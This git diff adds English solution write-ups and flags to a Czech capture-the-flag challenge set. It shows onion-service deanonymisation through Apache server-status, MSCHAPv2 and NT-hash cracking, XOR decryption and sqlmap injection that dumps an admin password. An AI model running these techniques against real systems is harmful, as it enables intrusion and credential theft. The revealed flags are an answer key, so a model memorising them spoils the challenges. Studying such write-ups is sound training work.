@@ -122,12 +122,83 @@ Zjisti skutečnou IP adresu serveru, na kterém je provozována skrytá služba 
 
 ### Postup řešení
 
+Install needed stuff.
+
+```bash
+root@kali:~# sudo apt-get install -y tor socat nikto
+```
+
+Run `tor` in the background.
+
+```bash
+root@kali:~# tor &
+[1] 7503
+
+May 08 09:53:27.629 [notice] Tor 0.3.5.8 running on Linux with Libevent 2.1.8-stable, OpenSSL 1.1.1, Zlib 1.2.11, Liblzma 5.2.2, and Libzstd 1.3.5.
+May 08 09:53:27.629 [notice] Tor can't help you if you use it wrong! Learn how to be safe at https://www.torproject.org/download/download#warning
+May 08 09:53:27.629 [warn] Tor was compiled with zstd 1.3.8, but is running with zstd 1.3.5. For safety, we'll avoid using advanced zstd functionality.
+May 08 09:53:27.629 [notice] Read configuration file "/etc/tor/torrc".
+May 08 09:53:27.633 [notice] Opening Socks listener on 127.0.0.1:9050
+May 08 09:53:27.633 [notice] Opened Socks listener on 127.0.0.1:9050
+May 08 09:53:27.000 [notice] Parsing GEOIP IPv4 file /usr/share/tor/geoip.
+May 08 09:53:27.000 [notice] Parsing GEOIP IPv6 file /usr/share/tor/geoip6.
+May 08 09:53:27.000 [warn] You are running Tor as root. You don't need to, and you probably shouldn't.
+May 08 09:53:27.000 [notice] Bootstrapped 0%: Starting
+May 08 09:53:28.000 [notice] Starting with guard context "default"
+May 08 09:53:28.000 [notice] Bootstrapped 10%: Finishing handshake with directory server
+May 08 09:53:28.000 [notice] Bootstrapped 80%: Connecting to the Tor network
+May 08 09:53:28.000 [notice] Bootstrapped 90%: Establishing a Tor circuit
+May 08 09:53:28.000 [notice] Bootstrapped 100%: Done
+```
+
+Run `socat` on background to map onion address to `127.0.0.1:8000`
+
+```bash
+root@kali:~# socat TCP4-LISTEN:8000,reuseaddr,fork SOCKS4A:127.0.0.1:ixbttupkdzeamjjkjyeqwkdmoawirpvxvzez3t5htq2nia24bink53ad.onion:80,socksport=9050 &
+[2] 7550
+```
+
+Run `nikto` against remapped onion address `127.0.0.1:8000`.
+(Note: This can take quite long time - over an hour for all scans.)
+
+```bash
+root@kali:~# nikto -h http://127.0.0.1:8000
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          127.0.0.1
++ Target Hostname:    127.0.0.1
++ Target Port:        8000
++ Start Time:         2019-05-08 09:54:23 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ / - Requires Authentication for realm 'Restricted Area'
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-561: /server-status: This reveals Apache information. bashent out appropriate line in the Apache conf file or restrict access to allowed sources.
+May 08 11:10:06.000 [notice] Your system clock just jumped 3170 seconds forward; assuming established circuits no longer work.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8042 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2019-05-08 11:36:40 (GMT-4) (6137 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+Check for `OSVDB-561: /server-status` as `nikto` suggested:
+
+```bash
+root@kali:~# curl http://127.0.0.1:8000/server-status
+```
+
+[Server status](/09/server-status.png) site contained hostname ` cardingphorum.com`, just `dig` it and you have the IP address.
+
 ---
 
 ### Flag:
 
 ```
-temp
+31.31.76.46
 ```
 
 ---
@@ -151,12 +222,54 @@ mschapv2: Wed Apr 10 19:51:13 2019
 
 ### Postup řešení
 
+Using [chapcrack tool](https://github.com/moxie0/chapcrack) we convert the MSCHAPv2 challenge / response pair into string in CloudCracker Submission format:
+
+```bash
+root@kali:~/chapcrack# ./chapcrack.py radius -C 94:0f:90:ec:96:ce:32:ec -R f0:8f:68:d2:29:94:da:62:be:c3:6e:26:b0:b1:1d:81:d9:01:24:73:5d:dd:ba:60
+Cracking K3............
+                     C1 = f08f68d22994da62
+                     C2 = bec36e26b0b11d81
+                     C3 = d90124735dddba60
+                      P = 940f90ec96ce32ec
+                     K3 = a0b80000000000
+CloudCracker Submission = $99$lA+Q7JbOMuzwj2jSKZTaYr7DbiawsR2BoLg=
+```
+
+We submit this to the online service [crack.sh](https://crack.sh/get-cracking/) and after 26 hours or less we get `NT hash`:
+
+```email
+From crack.sh:
+
+Crack.sh has successfully completed its attack against your MSCHAPv2 handshake.
+The NT hash for the handshake is included below,
+and can be plugged back into the 'chapcrack' tool to decrypt a packet capture,
+or to authenticate to the server:
+
+Token: $99$lA+Q7JbOMuzwj2jSKZTaYr7DbiawsR2BoLg=
+Key: 179ba8ef1a67098d535c72de9901a0b8
+
+This run took 63804 seconds.
+Thank you for using crack.sh, this concludes your job.
+```
+
+Subsequently we use [hashcat](https://hashcat.net/hashcat/) to crack this `NT hash` to get plain text password:
+
+```bash
+hashcat -m 1000 -w 3 -o found.txt -a 3 --username NT_hash.txt -1 ?l?d?u ?1?1?1?1?1?1?1?1 -i --increment-min 1 --increment-max 8
+```
+
+And after few hours we get:
+
+```
+179ba8ef1a67098d535c72de9901a0b8:d7Mus1fH
+```
+
 ---
 
 ### Flag:
 
 ```
-temp
+d7Mus1fH
 ```
 
 ---
@@ -231,6 +344,10 @@ Pro přihlášení do interního systému napadené společnosti je použita uti
 
 ### Postup řešení
 
+`000b8638` is the address of the string:
+```Congratulations you know the correct password```
+
+
 ---
 
 ### Flag:
@@ -252,12 +369,14 @@ Tajné heslo pro splnění tohoto úkolu je stejné, jako anglicky psané město
 
 ### Postup řešení
 
+Putting the name into facebook search returned `Jason Macrapatulos's` profile (currently defunct), which contained link to his twitter account [JasonMacra](https://twitter.com/JasonMacra) (currently defunct too). This contained post with the picture of his house. After clicking on the [picture](/09/JasonMacra_twitter.png), it revealed name of the city - `Brudges`.
+
 ---
 
 ### Flag:
 
 ```
-temp
+Brudges
 ```
 
 ---
@@ -319,7 +438,7 @@ Veinsg5Vskg2Fpcb
 
 ### Zadání:
 
-Zachytil jsi tajnou zprávu teroristické organizace. Podaří se ti ji rozluštit, pokud víš, že se jedná o Vernamovu šifru využívající operaci XOR nad klíčem, který je součástí textu Lorem Ipsum a odesilatel se v každé zprávě podepisuje jako Ahmed?
+Zachytil jsi tajnou zprávu teroristické organizace. Podaří se ti ji rozluštit, pokud víš, že se jedná o Vernamovu šifru využívající operaci XOR nad klíčem, který je součástí textu Lorem Ipsum a odesilatel se v každé zprávě podepisuje jako *Ahmed*?
 
 ```
 26041 f0f0a 54170 04f06 01011 b4f55 181d1 6001d 14005 d5722
@@ -334,12 +453,51 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pharetra euismod ex
 
 ### Postup řešení
 
+For this task we will use [CyberChef](https://gchq.github.io/CyberChef/).
+
+The cypher text has `98` hex characters, therefore ASCII length of the cypher text, plain text and the key is `49` ASCII characters. We know that author always signs as `Ahmed`.
+
+
+Converting `Ahmed` [to hex](https://gchq.github.io/CyberChef/#recipe=To_Hex('Space')&input=Ahmed) we get:
+
+```hexdump
+00000000  41 68 6d 65 64  |Ahmed|
+00000005
+```
+
+Taking last `10 hexa` (5 ASCII) characters of `cypher text` we have:
+
+```hexdump
+00000000  33 01 0e 00 17  |3....|
+00000005
+```
+
+ So XORing last 10 hexa (5 ASCII) characters of the `cypher text` with the last 10 hexa (5 ASCII) characters of the plain text (`Ahmed`) will give us:
+
+```hexdump
+00000000  72 69 63 65 73  |rices|
+00000005
+```
+
+These are last 10 hexa (5 ASCII) characters of the 49 character `key`, which is part of provided `Lorem ipsum text`. Searching for `rices` in `Lorem ipsum` and taking whole 49 character key returns:
+
+```
+nascetur ridiculus mus. Mauris malesuada ultrices
+```
+
+[XORing](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Latin1','string':'nascetur%20ridiculus%20mus.%20Mauris%20malesuada%20ultrices'%7D,'Standard',false)&input=MjYwNDEgZjBmMGEgNTQxNzAgMDRmMDYgMDEwMTEgYjRmNTUgMTgxZDEgNjAwMWQgMTQwMDUgZDU3MjIKMTMxMTUgMjAwMDAgMDAyOTAgZDFiMGIgMTE0MDEgOTFjMjkgNDkwMjQgMjU0MzMgMDEwZTAgMDE3) cypher text with the whole key returns whole decrypted message:
+
+```
+Hello brother, the password is Dlwnb5xxHiw. Ahmed
+```
+
+
 ---
 
 ### Flag:
 
 ```
-temp
+Dlwnb5xxHiw
 ```
 
 ---
@@ -408,11 +566,64 @@ Cílový server používá pro monetizaci obsahu vlastní reklamní systém zalo
 
 ### Postup řešení
 
+After (long painful manual) checking for usual stuff we noticed that the URL for banner pictures [https://try2hack.me/a/5](https://try2hack.me/a/5) acts funny (can perform mathematical expressions and stuff). The trick was SQL injection behind URL rewrite, see [https://www.cybrary.it/0p3n/test-exploit-sql-injections-url-rewrite-rules/](https://www.cybrary.it/0p3n/test-exploit-sql-injections-url-rewrite-rules/) and [https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/) for reference.
+
+After checking for SQL injections with `sqlmap`:
+
+```bash
+sqlmap -u "https://try2hack.me/a/1*" --random-agent --level 5 --risk 3 --dbs
+```
+
+Which after while returned:
+
+```bash
+available databases [2]:
+[*] information_schema
+[*] production
+```
+
+Going forward with `production` DB, we list it's tables:
+
+
+```bash
+sqlmap -u "https://try2hack.me/a/1*" --random-agent --level 5 --risk 3 -D production --tables
+```
+
+And get:
+```bash
+Database: production
+[2 tables]
++---------+
+| adverts |
+| users   |
++---------+
+```
+
+Lets dump table `users`:
+
+```bash
+sqlmap -u "https://try2hack.me/a/1*" --random-agent --level 5 --risk 3 -D production -T users --dump
+```
+
+While dumping the table SQLmap detects hash in password column for the only user `admin` and offers to run dictionary attack against it, and voila:
+
+```bash
+[15:36:15] [INFO] cracked password 'Password123' for user 'admin'
+Database: production
+Table: users
+[1 entry]
++----+-------+-------+--------+------------------------------------------------+
+| id | name  | login | active | password                                       |
++----+-------+-------+--------+------------------------------------------------+
+| 1  | Admin | admin | 1      | 42f749ade7f9e195bf475f37a44cafcb (Password123) |
++----+-------+-------+--------+------------------------------------------------+
+```
+
 ---
 
 ### Flag:
 
 ```
-temp
+Password123
 ```
 
